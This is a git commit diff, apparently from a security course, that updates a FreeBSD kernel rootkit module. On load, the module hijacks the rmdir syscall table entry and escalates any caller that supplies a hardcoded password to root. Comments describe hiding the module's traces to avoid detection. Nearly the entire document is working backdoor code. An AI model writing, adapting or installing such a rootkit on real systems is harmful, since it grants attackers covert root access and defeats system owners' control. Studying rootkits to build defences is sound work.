256a6f68ff3e8d2d6ba17abd51c52f592b697a17
johnsonshi <johnson@johnsonshi.com>
2018-09-24 14:30:14 +1000

    Update hijacker module to hijack a syscall upon load. Escalation now only happens when the hijack victim has a valid syscall retval.

--- rootkits/priv_esc_syscall/module/hijack.c
+++ rootkits/priv_esc_syscall/module/hijack.c
@@ -1,17 +1,15 @@
+/*
+ * Kernel module that hijacks a pre-existing syscall.
+ * Hijacked syscall will act normally unless a specific arg is given,
+ * which escalates the process to root.
+ */
 #include <sys/param.h>
 #include <sys/module.h>
-#include <sys/sysent.h>
 #include <sys/kernel.h>
 #include <sys/systm.h>
-#include <sys/sysproto.h>
-#include <sys/errno.h>
-#include <sys/proc.h>
-#include <sys/syscall.h>
-#include <sys/syscallsubr.h>
-#include <sys/ucred.h>
-#include <sys/signal.h>
-#include <sys/types.h>
-#include <sys/signalvar.h>
+#include <sys/proc.h>       /* thread, proc */
+#include <sys/pcpu.h>       /* curthread */
+#include <sys/sysent.h>     /* sysentvec, sysent, sy_call_t */
 
 /* Escalate the current thread and its associated process to root. */
 static void
@@ -28,7 +26,7 @@ escalate(struct thread *td) {
 
 /* The system call's arguments. */
 struct sc_args {
-	char *passwd;
+    char *passwd;
 };
 
 /* Function pointer to the old syscall function that is being hijacked. */
@@ -47,13 +45,13 @@ new_sy_call(struct thread *td, void *syscall_args) {
     /* execute the syscall normally and take note of the return value */
     int retval = (*old_sy_call)(td, syscall_args);
 
-    struct sc_args *args = (struct sc_args *) syscall_args;
-
-    /* if no args were passed in, do not proceed since args->passwd is mapped
-     * to an invalid page (the first page). */
-    if (args->passwd < (char *) 4096) {
+    /* if the syscall failed then don't do anything.
+     * syscall_args may be mapped to invalid addresses if the retval != 0. */
+    if (retval != 0) {
         return (retval);
     }
+
+    struct sc_args *args = (struct sc_args *) syscall_args;
 
 #define PRIV_ESC_PASSWD "6447_priv_esc_passwd"
     if (strcmp(args->passwd, PRIV_ESC_PASSWD) == 0) {
@@ -63,50 +61,37 @@ new_sy_call(struct thread *td, void *syscall_args) {
     return (retval);
 }
 
-/* This system call will overwrite the syscall function handler
- * of another pre-existing/currently valid syscall.
- * The reason why we do the hijacking within a syscall itself is because
- * a syscall gets passed a struct thread, which contains its associated
- * struct proc, which contains a pointer to the sysentry array (struct
- * sysentvec), which contains a pointer to the system call entry table
- * (sv_table), which is an array of struct sysents.
- * This syscall module should be unloaded after this function is called to
- * minimize traces of its existence (since it would have already hijacked
- * another syscall and achieved its purpose).
- * The best syscalls to hijack are the ones that require only
- * one char* argument.
- * See /sys/kern/syscalls.master for a list of such suitable syscalls.
- */
+/* The function called at load/unload. */
 static int
-hijack_syscall(struct thread *td, void *syscall_args) {
+load(struct module *module, int cmd, void *arg) {
+
+    switch (cmd) {
+
+    case MOD_LOAD:
 
 /* rmdir syscall 137. */
 #define HIJACKED_SYSCALL 137
 
-    /* record the old syscall so that the hijacked syscall can still execute
-     * it (to avoid detection) and act as if the syscall is still working. */
-    old_sy_call = td->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call;
+        /* record the old syscall. */
+        old_sy_call = curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call;
 
-    /* redirect the entry to point to the new syscall handler. */
-    td->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
+        /* redirect the entry to point to the new syscall handler. */
+        curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
 
-	return (0);
-}
+        break;
 
-/* The sysent for the hijacker system call. */
-static struct sysent hijack_sysent = {
-	0,              /* number of arguments */
-	hijack_syscall  /* implementing function */
-};
+    default:
+        break;
+    }
 
-/* The offset in sysent[] where the hijacker system call is to be allocated. */
-/* NO_SYSCALL means load into the first available slot for loadable syscalls. */
-static int offset = NO_SYSCALL;
-
-/* The function called when the hijacker syscall is loaded/unloaded. */
-static int
-load(struct module *module, int cmd, void *arg) {
     return (0);
 }
 
-SYSCALL_MODULE(hijack_syscall, &offset, &hijack_sysent, load, NULL);
+/* The second argument of DECLARE_MODULE. */
+static moduledata_t hijack_mod = {
+    "hijack",       /* module name */
+    load,           /* event handler */
+    NULL            /* extra data */
+};
+
+DECLARE_MODULE(hijack, hijack_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
